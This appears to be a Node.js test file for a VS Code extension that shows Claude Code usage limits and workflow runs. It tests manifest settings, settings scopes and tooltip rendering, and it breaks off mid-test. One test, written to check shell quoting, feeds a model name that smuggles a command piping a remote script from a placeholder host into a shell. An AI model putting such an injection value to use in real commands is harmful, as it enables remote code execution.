const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const Module = require('node:module');

// `vscode` only exists inside the editor, so it is resolved to the stub before
// extension.js is loaded. This is the only way to run activate() in a test —
// and without it the file that wires everything together has no coverage at all.
const stubPath = require.resolve('./vscode-stub.js');
const resolve = Module._resolveFilename;
Module._resolveFilename = function patched(request, ...rest) {
    if (request === 'vscode') return stubPath;
    return resolve.call(this, request, ...rest);
};

// Every test in this file points the workflow collector at an empty scratch
// tree. That collection is not gated on what the bar mentions, so without this
// every activate() here walks the real ~/.claude — reading the transcripts of
// whatever other sessions happen to be running on the machine.
const EMPTY_TREE = fs.mkdtempSync(path.join(os.tmpdir(), 'ccsl-empty-'));
process.env.CLAUDE_STATUSLINE_PROJECTS = EMPTY_TREE;
test.after(() => fs.rmSync(EMPTY_TREE, { recursive: true, force: true }));

const vscode = require('./vscode-stub.js');
const ext = require('../extension');
const ix = require('../indexer');
const seg = require('../segments');
const wf = require('../workflows');
const db = require('../dashboard');
const u = require('../usage');
const s = require('../session');
const sys = require('../system');

function activate({ segments, workspace = '', settings = {}, hadSession } = {}) {
    vscode.__reset();
    vscode.__setSettings({
        segments, alignment: 'right', priority: 100, refreshInterval: 3600, ...settings,
    });
    vscode.__setWorkspace(workspace);
    const storage = fs.mkdtempSync(path.join(os.tmpdir(), 'ccsl-ext-'));
    // What the previous window left behind, which is what the sidebar is laid
    // out from before anything has been read.
    const memory = new Map(hadSession === undefined ? [] : [['hadSession', hadSession]]);
    const context = {
        subscriptions: [],
        globalStorageUri: { fsPath: storage },
        // The real one persists across windows; here it only has to survive one
        // activate, which is what the tab register is asked to do.
        globalState: {
            get: (key) => memory.get(key),
            update: (key, value) => { memory.set(key, value); },
        },
        // The real one points at the installed extension; here it points at the
        // repository, which is the same tree the icons are read from.
        extensionUri: { fsPath: path.join(__dirname, '..'), scheme: 'file' },
    };
    ext.activate(context);
    return {
        context,
        storage,
        dispose: () => {
            for (const d of context.subscriptions) d.dispose();
            fs.rmSync(storage, { recursive: true, force: true });
        },
    };
}

// The bar holds one item per segment and one that is no segment at all — the
// button that opens Claude Code. Everything about templates filters by id, so
// neither the button nor the order the two are created in can move a test that
// is about the segment list.
const segmentItems = () => vscode.__items.filter((i) => String(i.id).startsWith('claudeStatusline.segment'));
const openButtons = () => vscode.__items.filter((i) => i.id === 'claudeStatusline.open');

// A pinned limits cache. `u.readCache` reads ~/.claude/statusline-usage.json,
// which exists only where Claude Code has run — so the two tests below were
// asserting that this machine had used Claude Code today, and on a runner that
// has never seen it they failed on their own guard clauses. The guards were
// right; what they guarded was the wrong thing. Pinned, both tests are about
// what they name: that the page and the tooltip are cut from one list, and that
// a frozen context still gets the numbers through.
function pinLimits() {
    const real = u.readCache;
    const at = (secs) => new Date((Math.floor(Date.now() / 1000) + secs) * 1000).toISOString();
    u.readCache = () => ({
        limits: [
            { kind: 'session', percent: 12, resets_at: at(3600) },
            { kind: 'weekly_all', percent: 47, resets_at: at(3 * 86400) },
        ],
    });
    return () => { u.readCache = real; };
}

test('activate creates one status-bar item per configured segment', () => {
    const run = activate({ segments: ['claude', 'second one', 'third'] });
    try {
        assert.equal(segmentItems().length, 3);
        assert.deepEqual(segmentItems().map((i) => i.text), ['claude', 'second one', 'third']);
        // Priority descends along the list, so they read left to right in order.
        assert.deepEqual(segmentItems().map((i) => i.priority), [100, 99, 98]);
        assert.ok(segmentItems().every((i) => i.command === 'claudeStatusline.dashboard'));
    } finally { run.dispose(); }
});

// The button is the one item that reports nothing, so nothing in the collectors
// or in render() would notice if it stopped being created, stopped being shown,
// or drifted to the right of the numbers.
test('the bar opens with a button left of every segment', () => {
    const run = activate({ segments: ['claude', 'second one'] });
    try {
        assert.equal(openButtons().length, 1);
        const [btn] = openButtons();
        assert.equal(btn.command, 'claudeStatusline.openClaude');
        assert.equal(btn.text, '$(terminal)$(sparkle)');
        // A created item is hidden until it is shown, and this one is not on
        // render()'s show/hide path — miss the show() and the button never appears.
        assert.equal(btn.visible, true);
        // Higher priority is further left on either side of the bar.
        assert.ok(btn.priority > segmentItems()[0].priority);
        // The name is what the bar's own context menu offers to hide, beside
        // every other extension's — so it names this one rather than reading as
        // an entry of Claude Code's, which sits in that same list.
        assert.equal(btn.name, 'Dashnlines for Claude: Open');
        assert.deepEqual(segmentItems().map((i) => i.name), ['Dashnlines for Claude 1', 'Dashnlines for Claude 2']);
    } finally { run.dispose(); }
});

// The one request this extension makes carries the user's OAuth token, so the
// switch that turns it off has to be worth the promise printed next to it: not
// "the bar stops updating" but "nothing is read and nothing is sent", including
// through the command that exists to force a refresh.
test('fetchLimits false leaves the token unread and the network untouched', async () => {
    const real = { refreshUsage: u.refreshUsage, touchStamp: u.touchStamp, readToken: u.readToken };
    let requests = 0;
    let tokenReads = 0;
    u.refreshUsage = async () => { requests++; return false; };
    u.touchStamp = () => { requests++; return true; };
    u.readToken = async () => { tokenReads++; return null; };
    const run = activate({ segments: ['✻ {weekly}'], settings: { fetchLimits: false } });
    try {
        await vscode.__commands.get('claudeStatusline.refresh')();
        assert.equal(requests, 0);
        assert.equal(tokenReads, 0);
    } finally {
        Object.assign(u, real);
        run.dispose();
    }
});

test('left at its default the refresh command does ask for limits', async () => {
    const real = { refreshUsage: u.refreshUsage, touchStamp: u.touchStamp, stampExpired: u.stampExpired };
    let requests = 0;
    u.refreshUsage = async () => { requests++; return false; };
    u.touchStamp = () => true;
    // The slow tick fires inside activate() and asks for limits too, but only
    // when the shared stamp has expired — which depends on whether anything
    // else on the machine refreshed recently. Pinning it keeps this test about
    // the command rather than about the state of ~/.claude: without it the
    // count is 1 on a machine running Claude Code and 2 on a clean one, and CI
    // is always the clean one.
    u.stampExpired = () => false;
    const run = activate({ segments: ['✻ {weekly}'] });
    try {
        await vscode.__commands.get('claudeStatusline.refresh')();
        assert.equal(requests, 1);
    } finally {
        Object.assign(u, real);
        run.dispose();
    }
});

test('with no segments configured the bar falls back to the built-in four', () => {
    const run = activate({ segments: undefined });
    try {
        assert.equal(segmentItems().length, seg.DEFAULT_SEGMENTS.length);
    } finally { run.dispose(); }
});

test('a segment whose placeholders have nothing to say hides itself', () => {
    // No workspace, so there is no session: every session-scoped field is empty.
    const run = activate({ segments: ['ctx {ctx}', 'literal text'] });
    try {
        const [dynamic, literal] = segmentItems();
        assert.equal(dynamic.visible, false, 'nothing to report, so nothing is shown');
        assert.equal(literal.visible, true, 'text with no placeholders is the user\'s own decoration');
    } finally { run.dispose(); }
});

test('changing the configuration rebuilds the items without a reload', () => {
    const run = activate({ segments: ['one'] });
    try {
        assert.equal(segmentItems().length, 1);
        const first = segmentItems()[0];
        const oldButton = openButtons()[0];

        vscode.__setSettings({ segments: ['a', 'b'], alignment: 'left', priority: 50, refreshInterval: 3600 });
        vscode.__changeConfiguration();

        assert.equal(first.disposed, true, 'the old item is disposed, not left behind');
        assert.equal(segmentItems().length, 2);
        assert.deepEqual(segmentItems().map((i) => i.text), ['a', 'b']);
        assert.equal(segmentItems()[0].alignment, vscode.StatusBarAlignment.Left);
        // The button is rebuilt here too — it carries the alignment and follows
        // the priority — and this runs on every settings change, so an old one
        // left behind would pile up a button per keystroke on the Settings tab.
        assert.equal(oldButton.disposed, true);
        assert.equal(openButtons().length, 1);
        assert.equal(openButtons()[0].alignment, vscode.StatusBarAlignment.Left);
        assert.ok(openButtons()[0].priority > segmentItems()[0].priority);
    } finally { run.dispose(); }
});

// The default bar is written twice: once in segments.js, once in the manifest
// where the settings UI reads it. A user who never sets the key gets the
// module's copy; one who clicks "reset to default" in VS Code gets the
// manifest's. They have to be the same list.
test('the manifest ships the same default bar as the module', () => {
    const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8'));
    const declared = manifest.contributes.configuration.properties['claudeStatusline.segments'].default;
    assert.deepEqual(declared, seg.DEFAULT_SEGMENTS);
});

// The places are written twice as well — as the enum a user picks from and as
// the table the button reads — and a value in one and not the other is a
// setting that silently does nothing.
test('the manifest offers exactly the places the button knows', () => {
    const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8'));
    const property = manifest.contributes.configuration.properties['claudeStatusline.openLocation'];
    assert.deepEqual(property.enum, Object.keys(ext.__PLACES));
    // And the cards on the Settings tab are that same list, in that same order.
    assert.deepEqual(property.enum, db.PLACES.map(([value]) => value));
    assert.equal(property.enum.length, property.enumDescriptions.length);
    assert.ok(ext.__PLACES[property.default], 'the default is one of them');
});

// The launch settings end up on a command line, so where they may come from is
// the whole of their safety. A repository carries its own `.vscode/settings.json`
// and VS Code lets it override anything of the default `window` scope — which
// for free text written into a shell means a cloned project could run whatever
// it liked the moment the button was pressed. `machine` scope is VS Code's own
// answer: user settings only. The other two need no such guard because a value
// outside their list is not passed at all.
// Three places offer the same two vocabularies — the settings dropdown, the
// Settings tab and the quick pick — and only one list exists, in dashboard.js.
// This is what says so out loud.
test('the manifest offers exactly the models and efforts the page does', () => {
    const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8'));
    const props = manifest.contributes.configuration.properties;
    const lists = [['model', db.MODELS], ['effort', db.EFFORTS], ['advisor', db.ADVISORS], ['outputStyle', db.STYLES]];
    for (const [key, list] of lists) {
        const property = props[`claudeStatusline.${key}`];
        assert.deepEqual(property.enum, list.map(([value]) => value));
        assert.equal(property.enum.length, property.enumDescriptions.length);
        assert.equal(property.default, '', 'empty is the default: no flag, the client decides');
    }
});

// The list is a closed one, so it is a claim about the client rather than a
// menu of our own — and a claim that goes stale on somebody else's release. It
// did: `Concise` shipped in 2.1.237 and could not be picked here at all, while
// the comment above the list still said there were four. Names come from the
// client's own strings; the docs were still listing four when this was written.
test('every output style the client ships can be picked here', () => {
    const names = db.STYLES.map(([value]) => value);
    assert.deepEqual(names, ['', 'default', 'Proactive', 'Explanatory', 'Learning', 'Concise']);
    // Capitalised exactly as the client spells them, because the value travels
    // verbatim into `--settings` and an unknown style is simply ignored there.
    for (const name of names.filter(Boolean).filter((n) => n !== 'default')) {
        assert.match(name, /^[A-Z]/, `${name} must match the client's own spelling`);
    }
});

// The permission mode is a security gate and the fallback chain names a model
// that will run: neither is a repository's to set through `.vscode/settings.json`,
// any more than the free-text arguments are.
test('a workspace cannot supply the free-text launch arguments, the permission mode or the fallback', () => {
    const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8'));
    const props = manifest.contributes.configuration.properties;
    assert.equal(props['claudeStatusline.launchArgs'].scope, 'machine');
    assert.equal(props['claudeStatusline.permissionMode'].scope, 'machine');
    assert.equal(props['claudeStatusline.fallbackModel'].scope, 'machine');
    assert.deepEqual(ext.__USER_ONLY, ['launchArgs', 'aliasName', 'permissionMode', 'fallbackModel']);
    for (const key of ['claudeStatusline.model', 'claudeStatusline.effort']) {
        assert.ok(Array.isArray(props[key].enum) && props[key].enum.length > 1, `${key} must be a closed list`);
    }
});

// The list in the manifest is a dropdown, not a guarantee: settings.json takes
// any string. What makes that harmless is the quoting — a value with shell
// syntax in it stays one argument to `claude` and is never a command of its own.
test('shell syntax inside a model name stays a single argument', async () => {
    const run = activate({ segments: ['{today}'], settings: { model: "opus'; curl evil.sh | sh; #" } });
    try {
        await openClaude();
        const line = ranIn(lastTerminal());
        assert.equal(line, `claude --model 'opus'\\''; curl evil.sh | sh; #'`);
        assert.doesNotMatch(line, /^claude --model 'opus'; /, 'the quote must be escaped, not closed');
    } finally { run.dispose(); }
});

// The Settings tab is the settings UI of this extension — a key it cannot reach
// is a key that exists only in settings.json, which is what that tab was built
// to avoid. The launch settings are no exception, and they are what a reader
// goes looking for after reading about them.
test('the launch settings are saved from the page like any other', async () => {
    const run = activate({ segments: ['{today}'] });
    let panel;
    try {
        panel = await openDashboard();
        await panel.__receive({
            type: 'save',
            scope: 'global',
            settings: { model: 'fable', effort: 'high', launchArgs: '--permission-mode acceptEdits' },
        });
        assert.equal(vscode.__updates.find((u) => u.key === 'model').value, 'fable');
        assert.equal(vscode.__updates.find((u) => u.key === 'effort').value, 'high');
        assert.equal(vscode.__updates.find((u) => u.key === 'launchArgs').value, '--permission-mode acceptEdits');
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// Writing a setting and never reading it back looks exactly like not saving it:
// the page redraws from the config the extension hands it, so a key missing
// there is a choice that appears to have been forgotten the moment it was made.
test('the page shows the launch settings it was saved with', async () => {
    const run = activate({
        segments: ['{today}'],
        settings: { model: 'opus[1m]', effort: 'max', launchArgs: '--fallback-model sonnet' },
    });
    let panel;
    try {
        panel = await openDashboard();
        assert.match(panel.webview.html, /name="model" value="opus" checked/);
        assert.match(panel.webview.html, /name="effort" value="max" checked/);
        assert.match(panel.webview.html, /id="launchArgs"[^>]*value="--fallback-model sonnet"/);
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// `launchArgs` is machine-scoped, so writing it into a workspace is not a choice
// the page can offer — VS Code refuses, and the whole save would fail with it.
test('the free-text arguments go to the user settings whatever scope was picked', async () => {
    const run = activate({ segments: ['{today}'] });
    let panel;
    try {
        panel = await openDashboard();
        await panel.__receive({
            type: 'save',
            scope: 'workspace',
            settings: { model: 'opus', launchArgs: '--fallback-model sonnet' },
        });
        const model = vscode.__updates.find((u) => u.key === 'model');
        const args = vscode.__updates.find((u) => u.key === 'launchArgs');
        assert.equal(model.target, vscode.ConfigurationTarget.Workspace);
        assert.equal(args.target, vscode.ConfigurationTarget.Global);
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// The two panes worth reading without scrolling are the limits and the session;
// the two lists below them are worth having, not worth the height. So the first
// two share the container evenly and the lists open closed — one click away, and
// none of it binds afterwards: VS Code remembers what the user drags.
test('the sidebar opens with limits and session even, and the lists collapsed', () => {
    const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8'));
    const views = Object.fromEntries(manifest.contributes.views.claudeStatusline.map((v) => [v.id, v]));
    assert.equal(views['claudeStatusline.limitsPane'].initialSize, views['claudeStatusline.sessionPane'].initialSize);
    assert.equal(views['claudeStatusline.livePane'].visibility, 'collapsed');
    assert.equal(views['claudeStatusline.runsPane'].visibility, 'collapsed');
});

// `initialSize` is applied when a pane is *first shown*, so a pane behind a
// `when` clause that turns true on the first tick arrives after the container
// has been laid out and takes whatever is left rather than its share. The answer
// from last time is therefore applied before anything is registered — a reload
// then builds the sidebar with both panes in it, and they split it evenly.
test('the session pane is asked for before the views are registered', () => {
    const run = activate({ segments: ['{today}'], hadSession: true });
    try {
        const keys = vscode.__executed.filter((e) => e.id === 'setContext' && e.args[0] === 'claudeStatusline.hasSession');
        assert.ok(keys.length > 0, 'the key must be set at all');
        assert.equal(keys[0].args[1], true, 'and the first answer is what was remembered');
    } finally { run.dispose(); }
});

// A view whose id the manifest declares and the extension never registers is an
// empty pane with a spinner in it — and renaming ids, which is the only way to
// make VS Code forget a remembered layout, is exactly how that happens.
test('every view the manifest declares is registered under that id', () => {
    const run = activate({ segments: ['x'] });
    try {
        const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8'));
        for (const view of manifest.contributes.views.claudeStatusline) {
            assert.ok(vscode.__views.has(view.id), `${view.id} is declared but never registered`);
        }
    } finally { run.dispose(); }
});

test('the commands the package manifest promises are all registered', () => {
    const run = activate({ segments: ['x'] });
    try {
        const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8'));
        for (const { command } of manifest.contributes.commands) {
            assert.ok(vscode.__commands.has(command), `${command} is declared but never registered`);
        }
    } finally { run.dispose(); }
});

// Both run commands read their run out of the tree node they are handed, so the
// palette — where there is no node — can only make them apologise. The manifest
// is the only place that decides this, which is why it is asserted here rather
// than through activate().
test('the run commands are wired to the tree row, not to the palette', () => {
    const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8'));
    const menus = manifest.contributes.menus;
    for (const command of ['claudeStatusline.openWorkflowScript', 'claudeStatusline.copyRunId']) {
        assert.ok(
            menus['view/item/context'].some((m) => m.command === command && /viewItem == run/.test(m.when)),
            `${command} never reaches the run row`,
        );
        assert.ok(
            menus.commandPalette.some((m) => m.command === command && m.when === 'false'),
            `${command} has no node to act on in the palette`,
        );
    }
    // An inline item is drawn as its icon and nothing else, and the icon is
    // declared on the command — a menu entry has no icon of its own.
    for (const item of menus['view/item/context'].filter((m) => m.group === 'inline')) {
        const declared = manifest.contributes.commands.find((c) => c.command === item.command);
        assert.ok(declared && declared.icon, `${item.command} is drawn inline, so it is drawn as an icon`);
    }
    // The inline entry is a button on hover; right-click reaches the other list.
    assert.ok(
        menus['view/item/context'].some((m) => m.command === 'claudeStatusline.openWorkflowScript' && m.group !== 'inline'),
        'opening the script must also be a plain context-menu item',
    );
});

test('deactivating disposes every item it created', () => {
    const run = activate({ segments: ['a', 'b'] });
    const created = [...vscode.__items];
    run.dispose();
    assert.ok(created.every((i) => i.disposed), 'no status-bar item may outlive the extension');
});

test('an unknown placeholder does not stop the rest of the bar from drawing', () => {
    const run = activate({ segments: ['{nope} still here'] });
    try {
        assert.equal(vscode.__items[0].text, '{nope} still here');
        assert.equal(vscode.__items[0].visible, true);
    } finally { run.dispose(); }
});

// A tooltip is text, so a share is written with the same blocks the bar draws.
// Both halves of this have been wrong once: a table row with more cells than its
// header silently loses the extras, and two tables with no blank line between
// them are read as one, which turns the second one into a wall of pipes.
test('a share in the hover is the bar the status bar itself draws', () => {
    const md = ext.__renderSection({
        id: 'demo',
        title: 'Demo',
        blocks: [
            { kind: 'pills', items: [{ text: 'max' }, { text: 'advisor', value: 'fable 5' }] },
            { kind: 'meters', rows: [{ label: '7d', value: '52%', pct: 52, note: 'Thu 13.08' }] },
            { kind: 'gauge', headline: '29%', value: '294k / 1M', sub: '706k free · 82% cached', pct: 29, chips: [] },
            { kind: 'parts', caption: 'in use', figure: 'your setup ~8.6%', rows: [
                { label: 'memory', value: '~6.7%', pct: 6.7, figure: '67k', note: 'instruction files' },
            ] },
            { kind: 'band', facts: ['master', 'v2.1.234'], chip: { label: 'update', value: '2.1.235', tail: 'ready' } },
            { kind: 'table', rows: [['from cache', '99%']] },
        ],
    });

    // The page has a heading row, a big figure and colour; a tooltip has one
    // width and one type size, so it says the same things with emphasis and
    // order — state, then the figure, then what it is made of, then the footer.
    assert.ok(md.includes('**max** · advisor **fable 5**'), `the pills are one line: ${md}`);
    assert.ok(md.includes('**29%** — 294k / 1M · 706k free · 82% cached'), `the gauge is one line: ${md}`);
    assert.ok(md.includes(`\`${u.bar(29, 29)}\` **29%**`), `the gauge keeps the bar: ${md}`);
    assert.ok(md.includes('master · v2.1.234 · update **2.1.235** ready'), `the band is one line: ${md}`);
    // Size and qualifier share the last column here — the page gives each its
    // own, a tooltip that wraps cannot.
    assert.ok(md.includes('67k · instruction files'), `the part keeps both facts: ${md}`);
    assert.ok(md.includes('**in use**'), `the caption survives: ${md}`);

    const lines = md.split('\n');
    const row = lines.find((line) => line.startsWith('| 7d '));
    // A meter is a share, not a pace, so it is drawn against its own percentage:
    // against a plan of zero every filled cell is hatched, and hatched means
    // spend past the plan.
    assert.ok(row.includes(`\`${u.bar(52, 52)}\``), `the meter is not the bar: ${row}`);
    assert.ok(!row.includes('▓'), `a share cannot be ahead of anything: ${row}`);

    const width = (line) => line.split('|').length - 1;
    lines.forEach((line, i) => {
        if (!line.startsWith('|---')) return;
        // A table's header is its `|---|` line and the row above it. Anything
        // but a blank line above that pair means the previous table swallowed
        // this one, and every row of it renders as text.
        assert.ok(!(lines[i - 2] || '').startsWith('|'), `a table starts inside another one:\n${md}`);
        // A row wider than the header loses its extra cells — here, the reset.
        for (let j = i + 1; j < lines.length && lines[j].startsWith('|'); j++) {
            assert.equal(width(lines[j]), width(line), `a row does not fit its header:\n${md}`);
        }
    });
});

test('workflow data is collected even when no segment mentions it', () => {
    const run = activate({ segments: ['✻ {weekly}'] });
    try {
        const state = run.context.claudeState;
        assert.ok(state.data.workflows, 'the collector ran');
        assert.ok(Array.isArray(state.data.workflows.runs));
        assert.ok(Array.isArray(state.data.workflows.active));
    } finally { run.dispose(); }
});

test('a workflow segment gets the workflow tooltip', () => {
    const run = activate({ segments: ['[$(gear) {wfName}][ {wfAgents}]'] });
    try {
        const state = run.context.claudeState;
        state.data.workflows = {
            runs: [],
            active: [{
                runId: 'wf_1', name: 'demo', state: 'running', startedAt: Date.now(),
                phases: [{ title: 'Scan' }],
                agents: [{
                    agentId: 'a1', label: '', phase: 'Scan', model: 'claude-opus-5',
                    state: 'running', promptPreview: 'делай', tokens: 1000, cost: 0,
                }],
                totals: { agents: 1, done: 0, cost: 0 },
            }],
        };
        ext.__render(state);

        const [item] = vscode.__items;
        assert.match(item.text, /demo/);
        assert.match(String(item.tooltip.value), /Scan/);
        assert.match(String(item.tooltip.value), /opus 5/);
    } finally { run.dispose(); }
});

// Three rules the hover shares with the surfaces beside it rather than keeping a
// copy of: how an agent with no label is named, how a model id is shortened, and
// that everything borrowed is escaped before it becomes markdown.
test('the hover names, shortens and escapes the way the rest of the extension does', () => {
    const run = activate({ segments: ['[$(gear) {wfName}]'] });
    try {
        const state = run.context.claudeState;
        const agent = {
            agentId: 'abcdef1234', label: '', phase: 'Scan',
            model: 'claude-haiku-4-5-20251001', state: 'running',
            promptPreview: 'проверь | индекс и верни таблицу находок по каждому файлу дерева, ничего не пропуская\nвторая строка',
            tokens: 0, cost: 0,
        };
        const going = {
            runId: 'wf_hover', name: '# **demo** $(error)', state: 'running', startedAt: Date.now(),
            phases: [{ title: 'Scan' }], agents: [agent],
            totals: { agents: 1, done: 0, cost: 0 },
        };
        state.data.workflows = { runs: [], active: [going] };
        ext.__render(state);
        const tip = String(vscode.__items[0].tooltip.value);

        // One naming rule, the tree's: sixty characters of the first line, not
        // forty characters running across two of them.
        const label = wf.agentLabel(agent);
        assert.equal(label.length, 60);
        assert.ok(tip.includes(label.replace(/\|/g, '\\|')), `the tree's own label is what the hover shows: ${tip}`);
        assert.doesNotMatch(tip, /вторая строка/, 'the second line is not part of a name');

        // One shortening rule, the dashboard's, which knows a dated model id.
        assert.match(tip, /haiku 4\.5/);
        assert.doesNotMatch(tip, /20251001/);

        // And nothing borrowed reaches the markdown as markup: a heading, bold
        // and an icon inside a name, a pipe that would split a row.
        assert.match(tip, /### \\# \\\*\\\*demo\\\*\\\* \$\\\(error\\\)/);
        assert.ok(tip.includes('проверь \\|'), 'a pipe inside a cell is escaped, not left to split it');
    } finally { run.dispose(); }
});

// A run directory laid out the way the client lays one out, so the fast tick can
// be driven straight instead of waiting out its ten-second interval.
function fakeRun(root, { runId = 'wf_test', session = 'sess-1', snapshot = null } = {}) {
    const base = path.join(root, '-fake-project', session);
    const runDir = path.join(base, 'subagents', 'workflows', runId);
    fs.mkdirSync(runDir, { recursive: true });
    fs.writeFileSync(path.join(runDir, 'journal.jsonl'), `${JSON.stringify({ type: 'started', agentId: 'a1' })}\n`);
    fs.writeFileSync(path.join(runDir, 'agent-a1.jsonl'),
        `${JSON.stringify({ type: 'user', message: { content: 'do the thing' } })}\n`
        + `${JSON.stringify({ type: 'assistant', message: { model: 'claude-opus-5', content: [] } })}\n`);
    if (snapshot) {
        fs.mkdirSync(path.join(base, 'workflows'), { recursive: true });
        fs.writeFileSync(path.join(base, 'workflows', `${runId}.json`), JSON.stringify(snapshot));
    }
    return runDir;
}

test('the fast tick re-reads a running workflow and keeps what its agents cost', () => {
    const run = activate({ segments: ['{wfAgents}'] });
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'ccsl-wf-'));
    try {
        const state = run.context.claudeState;
        const going = {
            runId: 'wf_live', name: 'live one', state: 'running', jsonPath: '',
            runDir: fakeRun(root, { runId: 'wf_live' }), startedAt: Date.now(), phases: [],
            // Priced by the slow tick: reading a whole transcript is its job, not
            // this tick's, so these numbers have to survive the refresh. The
            // preview is carried for a different reason — it cannot change, and
            // re-reading it costs the head of every transcript every ten seconds.
            agents: [{
                agentId: 'a1', state: 'running', tokens: 5000, cost: 1.25,
                promptPreview: 'what it was told, read once',
            }],
            totals: { agents: 1, done: 0, cost: 1.25 },
        };
        state.data.workflows = { runs: [going], active: [going] };

        ext.__collectWorkflowsFast(state);

        const [after] = state.data.workflows.runs;
        assert.equal(after.state, 'running', 'no snapshot, so the run is still going');
        assert.equal(after.agents.length, 1);
        assert.equal(after.agents[0].model, 'claude-opus-5', 'read from the transcript, not from the old record');
        assert.equal(after.agents[0].tokens, 5000, 'the price the slow tick found is carried across');
        assert.equal(after.agents[0].cost, 1.25);
        assert.equal(after.agents[0].promptPreview, 'what it was told, read once',
            'the preview is handed back, not read out of the transcript again');
        assert.equal(state.workflows.length, 1, 'the tree reads the same list');
    } finally {
        run.dispose();
        fs.rmSync(root, { recursive: true, force: true });
    }
});

// What this tick must never do is call a run failed because it noticed the end
// before it read how the end went: an empty status is the one reading the
// verdict rule has no word for, and the panel would show a red cross on a clean
// run until the next sweep, up to a minute later. So the status is taken from
// the same file the ending was taken from, and what is asserted is the verdict.
test('the fast tick retires a run whose snapshot has landed, with its verdict', () => {
    const run = activate({ segments: ['{wfAgents}'] });
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'ccsl-wf-'));
    try {
        const state = run.context.claudeState;
        // No jsonPath: a running run has none, since the scan that fills it is
        // exactly what this tick must not do.
        const snapshot = {
            runId: 'wf_over', workflowName: 'over', status: 'completed', durationMs: 60000,
            phases: [{ title: 'Scan' }],
            workflowProgress: [{
                type: 'workflow_agent', label: 'scan:one', phaseTitle: 'Scan',
                agentId: 'a1', model: 'claude-opus-5', state: 'done',
            }],
        };
        const going = {
            runId: 'wf_over', name: 'over', state: 'running', jsonPath: '',
            runDir: fakeRun(root, { runId: 'wf_over', snapshot }), startedAt: Date.now(),
            phases: [], agents: [{ agentId: 'a1', state: 'running', cost: 2.5, tokens: 9000 }],
            totals: { agents: 1, done: 0, cost: 2.5, tokens: 9000 },
        };
        state.data.workflows = { runs: [going], active: [going] };

        ext.__collectWorkflowsFast(state);

        const [after] = state.data.workflows.runs;
        assert.equal(after.state, 'finished');
        assert.deepEqual(state.data.workflows.active, [], 'and it stops being one of the running ones');
        assert.deepEqual(wf.verdictOf(after), { word: 'completed', outcome: 'done' },
            'a run that ended cleanly does not spend a minute wearing a failure');
        assert.equal(wf.treeNodes([after])[0].icon, 'check');
        assert.equal(after.agents[0].label, 'scan:one', 'the real labels arrive with it');
        assert.equal(after.totals.cost, 2.5, 'and what was already priced is not dropped');
    } finally {
        run.dispose();
        fs.rmSync(root, { recursive: true, force: true });
    }
});

// The same flip where the snapshot says nothing about how it went. The run is
// over — the file exists — but nobody recorded an outcome, and the honest answer
// is a question mark rather than the cross a missing word used to draw.
test('a run whose snapshot carries no status is not called a failure', () => {
    const run = activate({ segments: ['{wfAgents}'] });
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'ccsl-wf-'));
    try {
        const state = run.context.claudeState;
        const going = {
            runId: 'wf_mute', name: 'mute', state: 'running', jsonPath: '',
            runDir: fakeRun(root, { runId: 'wf_mute', snapshot: {} }), startedAt: Date.now(),
            phases: [], agents: [], totals: { agents: 1, done: 0, cost: 0 },
        };
        state.data.workflows = { runs: [going], active: [going] };

        ext.__collectWorkflowsFast(state);

        const [after] = state.data.workflows.runs;
        assert.equal(after.state, 'finished');
        assert.deepEqual(wf.verdictOf(after), { word: '', outcome: 'unknown' });
        assert.equal(wf.treeNodes([after])[0].icon, 'question');
    } finally {
        run.dispose();
        fs.rmSync(root, { recursive: true, force: true });
    }
});

// A run of two hundred agents is a wall, not a hint: the hover shows a dozen and
// says how many it is not showing, while the tree and the dashboard have the room
// for the full list. The ones still working come first — that is what a hover
// over a live run is asked about.
test('the tooltip shows a dozen agents and counts the rest', () => {
    const run = activate({ segments: ['[$(gear) {wfName}]'] });
    try {
        const state = run.context.claudeState;
        const agent = (i, agentState) => ({
            agentId: `a${i}`, label: `agent-${i}`, phase: 'Scan', model: 'claude-opus-5',
            state: agentState, promptPreview: '', tokens: 0, cost: 0,
        });
        // The working ones are written last, so taking the first twelve in order
        // would hide every one of them.
        const agents = [...Array(16)].map((_, i) => agent(i, 'done'))
            .concat([...Array(4)].map((_, i) => agent(`live${i}`, 'progress')));
        const going = {
            runId: 'wf_many', name: 'many', state: 'running', startedAt: Date.now(),
            phases: [], agents, totals: { agents: 20, done: 16, cost: 0 },
        };
        state.data.workflows = { runs: [going], active: [going] };
        ext.__render(state);

        const tip = String(vscode.__items[0].tooltip.value);
        const rows = tip.split('\n').filter((line) => line.startsWith('| $('));
        assert.equal(rows.length, 12, 'a dozen rows, whatever the run is doing');
        assert.match(tip, /8 more/, 'and the rest are counted, not dropped silently');
        for (let i = 0; i < 4; i++) {
            // The dash arrives escaped: a label is borrowed text on its way into
            // markdown, and everything markdown reads as syntax is neutralised.
            assert.match(tip, new RegExp(`agent\\\\-live${i}`), 'the working agents are the ones shown');
        }
    } finally { run.dispose(); }
});

// The provider decides one thing of its own — whether a row starts open — and
// turns a node into an item; everything it draws was decided in treeNodes. What
// this covers is the wiring: the view really got a provider, the provider
// answers, and borrowed text arrives escaped rather than as markup.
test('the workflow view draws the runs the collector filled', () => {
    const run = activate({ segments: ['{wfRuns}'] });
    try {
        const state = run.context.claudeState;
        const going = {
            runId: 'wf_shown', slug: '-p', sessionId: 'sess-1', name: 'shown', state: 'running',
            lastActivity: 2, phases: [], totals: { agents: 1, done: 0 },
            agents: [{
                agentId: 'a1', label: '', phase: '', model: 'claude-opus-5', state: 'running',
                promptPreview: '# делай это', resultPreview: '', tokens: 2000,
            }],
        };
